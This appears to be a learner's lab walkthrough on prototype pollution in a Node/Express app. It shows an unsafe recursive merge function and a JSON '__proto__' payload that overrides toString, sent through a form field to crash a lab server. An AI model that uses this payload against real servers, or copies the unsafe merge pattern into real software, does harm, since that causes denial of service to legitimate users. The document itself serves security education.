Prototype pollution, a critical vulnerability in JavaScript applications, can lead to a Denial of Service (DoS) attack, among other severe consequences. This occurs when an attacker manipulates the prototype of a widely used object, causing the application to behave unexpectedly or crash altogether. In JavaScript, objects inherit properties and methods from their prototype, and altering this prototype impacts all objects that share it.

For example, if an attacker pollutes the `Object.prototype.toString` method, every subsequent call to this method by any object will execute the altered behaviour. In a complex application where `toString` is frequently used, this can lead to unexpected results, potentially causing the application to malfunction. The `toString` method is universally used in JavaScript. It's automatically invoked in many contexts, especially when an object needs to be converted to a string.

If the polluted method leads to inefficient processing or an infinite loop, it can exhaust system resources, effectively causing a DoS condition. Moreover, prototype pollution can also interfere with the application's business logic. Altering essential methods or properties might trigger unhandled exceptions or errors, leading to the termination of processes or services. This could render the server unresponsive in web applications, denying service to legitimate users.

## Example
- Again, visit the URL `http://MACHINE_IP:5000` and see if we can crash the server through any input. As discussed, we have a method `Object.prototype.toString` that converts an object to a String datatype.  
- Visit the profile page of any friend; we can see from the previous task here how the server-side code looks like
```html
<form action="/clone-album/1" method="post" class="mb-4">
        <h2 class="mb-3">Clone Album of Josh</h2>
        <div class="form-group">
            <label for="selectedAlbum">Select an Album to Clone:</label>
            <select class="form-control" name="selectedAlbum" id="selectedAlbum">
                    <option value="Trip to US">
                        Trip to US
                    </option>
            </select>
        </div>
        <div class="form-group">
            <label for="newAlbumName">New Album Name:</label>
            <input type="text" class="form-control" name="newAlbumName" id="newAlbumName"
                placeholder="Enter new album name">
        </div>
        <button type="submit" class="btn btn-primary">Clone Album</button>
    </form>
```

```javascript
app.post("/clone-album/:friendId", (req, res) => {
  const { friendId } = req.params;
  const { selectedAlbum, newAlbumName } = req.body;
  const friend = friends.find((f) => f.id === parseInt(friendId));
  if (!friend) {
    console.log("Friend not found");
    return res.status(404).send("Friend not found");
  }
  const albumToClone = friend.albums.find(
    (album) => album.name === selectedAlbum
  );
  if (albumToClone && newAlbumName) {
    let clonedAlbum = { ...albumToClone };
    try {
      const payload = JSON.parse(newAlbumName);
      merge(clonedAlbum, payload);
    } catch (e) {
    }

function merge(to, from) {
  for (let key in from) {
    if (typeof to[key] == "object" && typeof from[key] == "object") {
      merge(to[key], from[key]);
    } else {
      to[key] = from[key];
    }
  }
  return to;
}```

- We see that this function is calling the *merge* function, which merges two objects. What if we try to send a payload that will override an existing function like `toString()`, and then if we call it on some object, it will cause abrupt behaviour for the server?  
- To prepare a payload, let's take a simple JSON code that will override the toString function as shown below:

```javascript
{"__proto__": {"toString": "Just crash the server"}}
```

- Go to the profile page and enter the payload instead of the new album name, as shown below:
	![](Pasted%20image%2020250125051048.png)
- Let's decode the payload once the `app.js` receives the request, parses the JSON, and assigns the `toString` function value in the `__proto__` property of the friend object.
- This creates an abrupt behaviour as `toString` is widely used among different objects. When we click on Clone Album, the application crashes, as shown below:
	![](Pasted%20image%2020250125051159.png)
- The `TypeError` we get is `Object.prototype.toString.call` is not a function, as we have already overridden that function using Prototype pollution.
- You can override several other built-in objects/functions like `toJSON`, `valueOf`, `constructor`, etc., but the application won't crash in all behaviours. It entirely depends on the function that you are overriding.
